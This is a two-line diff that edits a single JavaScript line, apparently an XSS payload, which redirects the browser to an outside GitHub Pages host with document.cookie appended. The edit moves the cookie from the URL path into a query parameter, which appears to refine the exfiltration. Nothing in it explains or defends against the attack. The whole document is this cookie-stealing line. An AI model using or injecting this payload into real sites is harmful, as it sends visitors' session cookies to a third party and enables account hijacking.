@@ -1,2 +1,2 @@
 
-location.href='https://seungmindev.github.io/'+document.cookie;
+location.href='https://seungmindev.github.io?q='+document.cookie;
